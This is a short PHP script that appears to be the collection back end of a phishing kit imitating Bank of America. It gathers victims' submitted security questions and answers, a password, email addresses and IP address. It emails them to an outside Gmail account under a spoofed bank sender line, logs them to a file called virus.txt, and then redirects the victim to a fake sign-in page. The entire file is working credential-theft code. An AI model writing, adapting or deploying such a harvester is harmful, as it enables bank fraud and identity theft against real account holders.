<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-----------Bofa Job-----------\n";
$message .= "Question 1 : ".$_POST['formselect1']."\n";
$message .= "Answer 1 : ".$_POST['id']."\n";
$message .= "Question 2 : ".$_POST['formselect2']."\n";
$message .= "Answer 2 : ".$_POST['pass']."\n";
$message .= "Question 3 : ".$_POST['formselect3']."\n";
$message .= "Answer 3 : ".$_POST['idmail']."\n";
$message .= "Email Ad : ".$_POST['emails']."\n";
$message .= "IP : ".$ip."\n";
$message .= "-----------NextLevel-------------\n";

$send = "100fareedah@gmail.com";
$subject = "My Fresh BofA - $ip";
$headers = "From: BofA<support@mymoney.net>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("virus.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: index3.html?signinpage&update=/&cookiecheck=yes&destination=nba/signin&accountopening/ApplicationStartup/Application$update=&cookiecheck/yes&destinpage&update");

	 
?>